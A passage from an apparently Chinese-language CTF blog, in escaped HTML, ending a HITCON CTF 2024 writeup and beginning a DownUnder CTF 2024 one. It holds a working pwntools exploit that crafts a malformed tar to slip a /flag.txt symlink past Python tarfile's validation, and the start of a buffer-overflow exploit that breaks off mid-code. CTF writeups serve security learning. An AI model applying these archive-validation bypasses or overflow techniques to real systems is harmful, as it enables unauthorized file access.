style=\"color:#f92672\"\u003e.\u003c/span\u003etarinfo\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efromtarfile(self)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eexcept\u003c/span\u003e EOFHeaderError \u003cspan style=\"color:#66d9ef\"\u003eas\u003c/span\u003e e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eignore_zeros:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e_dbg(\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;0x\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%X\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e: \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%s\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e (self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eoffset, e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eoffset \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e BLOCKSIZE\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003econtinue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eexcept\u003c/span\u003e InvalidHeaderError \u003cspan style=\"color:#66d9ef\"\u003eas\u003c/span\u003e e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eignore_zeros:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e_dbg(\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;0x\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%X\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e: \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%s\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e (self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eoffset, e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eoffset \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e BLOCKSIZE\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003econtinue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eelif\u003c/span\u003e self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eoffset \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eraise\u003c/span\u003e ReadError(str(e)) \u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e None\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#...............................\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e tarinfo \u003cspan style=\"color:#f92672\"\u003eis\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003enot\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNone\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003emembers\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eappend(tarinfo)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    self\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e_loaded \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e tarinfo\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e可以發現如果 \u003ccode\u003eInvalidHeaderError\u003c/code\u003e 且 \u003ccode\u003eself.offset != 0\u003c/code\u003e 也就是不是第一個 block 的時候就會停止讀取。所以如果我在第二個檔案的 tar header 裡隨便找個數字並塞個 space 的話，\u003ccode\u003etarfile\u003c/code\u003e 就會只認出一個檔案，這時如果我把 \u003ccode\u003eflag.txt\u003c/code\u003e 的 symlink 放在第二個檔案以後，\u003ccode\u003etarfile\u003c/code\u003e 就不會檢查到，同時又可以被 busybox 的 \u003ccode\u003etar\u003c/code\u003e 解出來。這樣就能繞過檢查了。\u003c/p\u003e\n\u003cp\u003eexploit:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e pwn \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e subprocess\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e pathlib \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e Path\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e tempfile \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e TemporaryDirectory\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e base64\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e sys\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBLOCK_SIZE \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e512\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecalculate_tar_checksum\u003c/span\u003e(header):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e len(header) \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e BLOCK_SIZE:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eraise\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eValueError\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Header must be exactly \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eBLOCK_SIZE\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e bytes.\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    checksum \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e i \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(BLOCK_SIZE):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e148\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;=\u003c/span\u003e i \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e156\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            checksum \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e32\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            checksum \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e header[i]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e checksum\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ewith\u003c/span\u003e TemporaryDirectory() \u003cspan style=\"color:#66d9ef\"\u003eas\u003c/span\u003e tmpdir:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    subprocess\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erun(\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        [\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;touch\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;1\u0026#39;\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        check\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        cwd\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003etmpdir,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    )\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    subprocess\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erun(\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        [\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;touch\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;2\u0026#39;\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        check\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        cwd\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003etmpdir,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    )\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    subprocess\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erun(\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        [\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ln\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;-s\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/flag.txt\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;flag.txt\u0026#39;\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        check\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        cwd\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003etmpdir,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    )\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    subprocess\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erun(\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        [\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;tar\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cvf\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;payload.tar\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;1\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;2\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;flag.txt\u0026#39;\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        check\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        cwd\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003etmpdir,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    )\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    payload \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e Path(tmpdir) \u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;payload.tar\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ewith\u003c/span\u003e open(payload, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;rb\u0026#34;\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eas\u003c/span\u003e f:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        payloadbytes \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e f\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eread()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epayloadbytes \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e bytearray(payloadbytes)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epayloadbytes[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e BLOCK_SIZE \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x7D\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e ord(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39; \u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epayloadbytes \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e bytes(payloadbytes)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eheader_block \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e payloadbytes[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e BLOCK_SIZE:\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e BLOCK_SIZE]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003echecksum \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e oct(calculate_tar_checksum(header_block))[\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e:]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ezfill(\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epayloadbytes \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e bytearray(payloadbytes)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e i \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(len(checksum)):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    payloadbytes[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e BLOCK_SIZE \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x94\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e i] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e ord(checksum[i])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epayloadbytes \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e bytes(payloadbytes)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epayloadbase64 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e base64\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eb64encode(payloadbytes)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003econn \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e remote(sys\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eargv[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e], int(sys\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eargv[\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e]))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003econn\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esendline(payloadbase64)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprint(conn\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erecvuntil(\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://github.com/user-attachments/assets/22bbb2b6-242e-4211-a3ac-12936b702fe0\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ehitcon{is_it_still_possible_if_I_banned_the_presense_of_flag.txt_in_the_binary_data_of_the_tar_file?}\u003c/code\u003e\u003c/p\u003e\n\u003ch2 id=\"其他隊友的-writeup\"\u003e其他隊友的 writeup\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://hackmd.io/@Vincent550102/rydOoLWOR\"\u003eHackmd\u003c/a\u003e\u003c/p\u003e\n","description":"","image":"/images/CTF.png","permalink":"https://blog.chummydns.com/blogs/hitconctf-2024-writeup/","title":"HITCON CTF 2024 Writeup"},{"content":"\u003ch1 id=\"downunder-ctf-2024-writeup\"\u003eDownunder CTF 2024 Writeup\u003c/h1\u003e\n\u003cp\u003e第一次解保護全開的 PWN 好開心WW\u003c/p\u003e\n\u003ch2 id=\"yawa\"\u003eyawa\u003c/h2\u003e\n\u003ch3 id=\"exploit\"\u003eexploit\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e pwn\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epwn\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003econtext(arch\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;amd64\u0026#39;\u003c/span\u003e, os\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;linux\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003elibc \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e pwn\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eELF(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;./libc.so.6\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#r = pwn.process(\u0026#39;./yawa\u0026#39;)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e pwn\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eremote(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;2024.ductf.dev\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e30010\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erecvuntil(\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026gt; \u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esend(\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;1\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;a\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e88\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erecvuntil(\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026gt; \u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esend(\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;2\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erecvuntil(\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;aaa\u003c/span\u003e\u003cspan 